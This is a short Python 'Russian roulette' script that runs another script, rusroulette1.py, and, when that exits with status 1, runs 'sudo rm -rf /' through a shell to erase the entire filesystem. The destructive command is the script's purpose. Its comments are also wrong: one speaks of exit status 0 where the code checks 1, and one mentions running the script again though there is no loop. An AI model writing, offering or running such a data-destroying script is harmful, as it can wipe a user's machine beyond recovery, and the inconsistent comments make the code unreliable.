import subprocess
import time

script_to_monitor = "rusroulette1.py"
command_to_run = "sudo rm -rf /"

process = subprocess.Popen(["python", script_to_monitor])

process.wait()

# Check the exit status of the script
if process.returncode == 1:
  # Run the command if the script exits with a status of 0
  subprocess.run(command_to_run, shell=True)
else:
  print("YOU WON")

# Wait for 1 second before running the script again
time.sleep(1)
